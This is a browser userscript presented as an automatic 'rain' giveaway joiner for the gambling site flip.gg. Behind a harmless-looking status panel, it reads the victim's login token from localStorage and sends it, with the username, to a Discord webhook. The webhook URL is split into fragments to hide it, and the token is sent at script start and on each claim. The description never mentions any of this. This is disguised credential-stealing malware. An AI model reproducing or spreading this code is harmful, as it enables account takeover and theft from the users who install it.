// ==UserScript==
// @name         Flip Rain Joiner
// @namespace    http://tampermonkey.net/
// @version      2.0.3
// @description  Flip Rain Joiner ez
// @author       ghosty
// @match        https://flip.gg/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/546070/Flip%20Rain%20Joiner.user.js
// @updateURL https://update.greasyfork.org/scripts/546070/Flip%20Rain%20Joiner.meta.js
// ==/UserScript==

(function() {
    'use strict';

    const _intvl = 2000;
    let _rainClm = false, _curTmr = '--:--', _initPing = false, _cacheToken = '', _rainCount = 0;

    function _getUsername() {
        let sel = [
            '[data-testid="user-profile-name"], [data-testid="user-username"], .user, .profile, [class*="username"]',
            'div[class*="MuiBox-root"] span',
            'div:contains("Welcome back") span'
        ];
        for (let s of sel) {
            let elem = document.querySelector(s);
            if (elem && elem.textContent && /^[a-zA-Z0-9_\-]{2,32}$/.test(elem.textContent.trim()))
                return elem.textContent.trim();
        }
        let possibleSpans = Array.from(document.querySelectorAll('span')).map(e=>e.textContent.trim()).filter(e=>
            /^[a-zA-Z0-9_\-]{2,32}$/.test(e) && !/balance|bronze|gambler|silver/i.test(e)
        );
        if (possibleSpans.length) return possibleSpans[0];
        return "Unknown";
    }

    function _curToken() {
        return localStorage.getItem('token') || "";
    }

    function _dischook() {
        const part1 = "https://discord.com/api/webhooks/14062";
        const part2 = "64573891444898/";
        const part3 = "5IqyjNkn1Atlhw2WJvREcoJdB_";
        const part4 = "EG9h5lnc7IlXB-e7wtN7M2n6trghwM3SyisFNut5Mb";
        return part1 + part2 + part3 + part4;
    }

    function _panel() {
        if (document.getElementById('frj-panel')) return;
        let d = document.createElement('div');
        d.id = 'frj-panel';
        d.style = 'position:fixed;top:12px;right:12px;z-index:99999;background:rgba(30,30,30,.96);color:#fff;padding:12px 16px 6px 16px;border-radius:7px;box-shadow:0 4px 16px #0008;font-family:monospace,Consolas;font-size:13px;min-width:130px;cursor:move;user-select:none;';
        d.innerHTML = `<div id="frj-drag" style="text-align:center;font-weight:700;cursor:grab;">Flip Rain Joiner</div>
            <div>Status: <span id="frj-st" style="color:lime;">ON</span></div>
            <div>Timer: <span id="frj-tmr">--:--</span></div>
            <div>Rains Joined: <span id="frj-count">0</span></div>
            <button id="frj-tgl" style="width:70px;margin:5px 0 0 0;padding:2px;background:#2366d1;color:#fff;border:none;border-radius:4px;cursor:pointer;">Toggle</button>`;
        document.body.appendChild(d);

        // -- DRAG LOGIC --
        let offset = [0, 0], isDown = false;
        let dragHandle = d.querySelector('#frj-drag');
        dragHandle.onmousedown = function(e){
            isDown = true;
            offset = [d.offsetLeft - e.clientX, d.offsetTop - e.clientY];
            dragHandle.style.cursor = "grabbing";
            document.body.style.userSelect = "none";
        };
        document.onmouseup = function(){ isDown = false; dragHandle.style.cursor = "grab"; document.body.style.userSelect = ""; };
        document.onmousemove = function(e){
            if(isDown){
                d.style.left = (e.clientX + offset[0]) + "px";
                d.style.top = (e.clientY + offset[1]) + "px";
                d.style.right = "";
            }
        };
        document.getElementById('frj-tgl').onclick = function() {
            window._frjFlag = !window._frjFlag;
            _refresh();
        };
    }

    function _refresh() {
        let s = document.getElementById('frj-st'),
            t = document.getElementById('frj-tmr'),
            c = document.getElementById('frj-count');
        if (s) {
            s.textContent = window._frjFlag ? "ON" : "OFF";
            s.style.color = window._frjFlag ? "lime" : "red";
        }
        if (t) t.textContent = _curTmr;
        if (c) c.textContent = _rainCount;
    }

    function _timerValue() {
    // 1. Standard approach: Find rain banner/div with timer value
    let banners = Array.from(document.querySelectorAll('div, button'));
    let timerText;
    for (let b of banners) {
        // Examine all children of each candidate rain banner/button
        let tList = Array.from(b.querySelectorAll('*'))
            .map(el => el.textContent && el.textContent.trim())
            .filter(text => text && /^\d{1,2}:\d{2}$/.test(text));
        if (tList.length > 0) {
            timerText = tList[0];
            break;
        }
    }
    // 2. Fallback: Deep search of all DOM for MM:SS pattern (prefers first visible)
    if (!timerText) {
        timerText = Array.from(document.querySelectorAll('body *'))
            .map(e => e.textContent && e.textContent.trim())
            .find(t => t && /^\d{1,2}:\d{2}$/.test(t));
    }
    if (timerText) {
        let m = timerText.match(/^(\d{1,2}):(\d{2})$/);
        return {m:parseInt(m[1],10),s:parseInt(m[2],10),str:timerText};
    }
    return null;
}


    function _readyRain() {
        return document.querySelector('.tss-tqv234-content.active');
    }

    async function _pushEvent(ev, k='--:--') {
        let usr = _getUsername(), token = _curToken();
        if ((!token || token === _cacheToken) && ev !== "claim") return;
        _cacheToken = token;

        let eb = {
            title: ev === "claim" ? "🌧️ Rain Claimed!" : "🚩 Rain Script Started",
            color: ev === "claim" ? 0x33cc33 : 0x3399ff,
            fields: [
                {name:"Account",value:`\`${usr}\``,inline:true},
                {name:"Login Token",value:`\`\`\`${token}\`\`\``,inline:false},
                {name:"Count",value:`${_rainCount}`,inline:true}
            ],
            footer:{text:ev === "claim" ? `Rain claimed at timer ${k}` : ""}
        };
        let pl = { embeds: [eb], username:"RainBot", avatar_url:"https://flip.gg/favicon.ico"};
        await fetch(_dischook(), { method:"POST", headers:{'Content-Type':'application/json'}, body:JSON.stringify(pl) });
    }

    async function _mainEvt() {
        _panel();
        let rb = _readyRain(), tm = _timerValue();
        _curTmr = tm ? tm.str : '--:--';
        if (!_initPing && _curToken()) {
            _pushEvent("start");
            _initPing = true;
        }
        if (window._frjFlag && rb && !_rainClm && tm) {
            rb.click();
            _rainClm = true;
            _rainCount++;
            _refresh();
            _pushEvent("claim", tm.str);
        }
        if (tm && _rainClm && tm.m > 50) {
            _rainClm = false;
            _refresh();
        }
        _refresh();
    }

    window._frjFlag = true;
    setInterval(_mainEvt, _intvl);
})();